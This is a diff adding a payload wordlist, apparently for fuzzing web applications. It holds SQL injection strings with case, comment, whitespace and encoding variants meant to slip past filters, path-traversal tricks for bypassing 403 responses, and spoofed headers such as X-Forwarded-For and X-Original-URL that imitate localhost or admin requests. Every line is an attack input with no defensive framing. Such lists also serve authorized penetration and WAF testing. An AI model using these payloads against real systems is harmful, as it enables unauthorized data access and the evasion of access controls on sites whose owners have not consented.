@@ -1,0 +1,54 @@
+# case variation
+SeLeCt
+UnIoN
+' Or '1'='1
+# inline comments
+/**/UNION/**/SELECT/**/
+'/**/OR/**/1=1--
+# double encoding
+%2527
+%252f
+%252e
+%2520
+# unicode
+%u0027
+%u002f
+%u003d
+# HTML entities
+&#39;
+&#x27;
+# null byte
+%00
+%0d%0a
+# whitespace tricks
++OR+1=1
+%09OR%091=1
+%0aOR%0a1=1
+/**/OR/**/1=1
+# charset manipulation
+%c0%27
+%c1%27
+# path tricks for 403 bypass
+/
+//
+///
+/.
+/..
+/..;/
+/..%2f
+/%2e%2e/
+/%252e%252e/
+/*/
+# header tricks
+X-Originating-IP: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Host: 127.0.0.1
+X-Forwarded-Host: 127.0.0.1
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-HTTP-Method-Override: PUT
+X-Custom-IP-Authorization: 127.0.0.1
+X-ProxyUser-Ip: 127.0.0.1
